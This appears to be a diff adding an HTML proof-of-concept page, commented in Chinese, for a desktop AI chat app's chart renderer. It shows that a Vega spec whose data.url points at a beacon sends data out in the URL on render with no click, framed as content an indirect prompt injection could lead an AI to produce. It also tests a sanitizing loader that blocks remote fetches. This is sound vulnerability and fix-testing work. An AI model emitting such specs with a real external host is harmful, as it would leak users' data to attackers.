@@ -1,0 +1,74 @@
+<!doctype html>
+<html lang="zh">
+  <head>
+    <meta charset="utf-8" />
+    <title>vega 图表信标 PoC</title>
+    <style>
+      body { font-family: system-ui, sans-serif; padding: 24px; }
+      h2 { font-weight: 600; }
+      .note { color: #666; font-size: 13px; margin-bottom: 16px; }
+    </style>
+  </head>
+  <body>
+    <h2>月度销量（一张"看起来很普通"的图表）</h2>
+    <p class="note">
+      这张图表的定义里只多了一个字段：data.url。它本该是"去这个地址取数据"，
+      但地址被换成了本地信标。注意：从头到尾没有任何点击。
+    </p>
+    <div id="chart"></div>
+
+    <script type="module">
+      import vegaEmbed, { vega } from "vega-embed";
+
+      // ?safe=1 时安装与 Diagram.tsx 新增的 makeSafeLoader 完全相同的"门卫 loader"：
+      // sanitize 拒绝一切联网取数/取图，只放行 data:/blob:（纯内联、不联网）。
+      const SAFE = new URL(location.href).searchParams.get("safe") === "1";
+      let loader;
+      if (SAFE) {
+        const INLINE_ONLY = /^\s*(?:data|blob):/i;
+        loader = vega.loader();
+        const sanitize = loader.sanitize.bind(loader);
+        loader.sanitize = (uri, options) =>
+          INLINE_ONLY.test(String(uri))
+            ? sanitize(uri, options)
+            : Promise.reject(new Error("已拦截图表的远程资源请求：" + uri));
+      }
+
+      // 与 apps/desktop/src/renderer/components/chat/Diagram.tsx 的 VegaCanvas 完全相同的调用：
+      //   vegaEmbed(el, JSON.parse(code), { renderer: "svg", actions: false, config: { background: "transparent" } })
+      // 唯一不同：这里的 spec 模拟"被攻击者间接注入诱导 AI 写出"的内容——data.url 指向本地信标。
+      const spec = {
+        description: "月度销量",
+        // ↓ 渲染时 vega 的 loader 会直接 fetch 这个地址（无 DOMPurify、无 safe-url 白名单）。
+        //   secret=... 演示"信标可顺带把数据塞在 URL 里带出去"。
+        data: {
+          url: "http://127.0.0.1:9099/vega-data-fetch?secret=CANARY-1234",
+          format: { type: "json" },
+        },
+        mark: "bar",
+        encoding: {
+          x: { field: "month", type: "nominal" },
+          y: { field: "sales", type: "quantitative" },
+        },
+      };
+
+      window.__demoError = null;
+      try {
+        await vegaEmbed("#chart", spec, {
+          renderer: "svg",
+          actions: false,
+          config: { background: "transparent" },
+          ...(loader ? { loader } : {}),
+        });
+      } catch (e) {
+        // 信标返回的是 1x1 gif，vega 把它当 JSON 解析会报错——但这发生在 fetch 之后，
+        // 信标早已命中。这恰好说明：联网发生在"画图过程中"，画完之前就已经打出去了。
+        window.__demoError = String(e);
+      } finally {
+        const done = document.createElement("div");
+        done.id = "demo-done";
+        document.body.appendChild(done);
+      }
+    </script>
+  </body>
+</html>
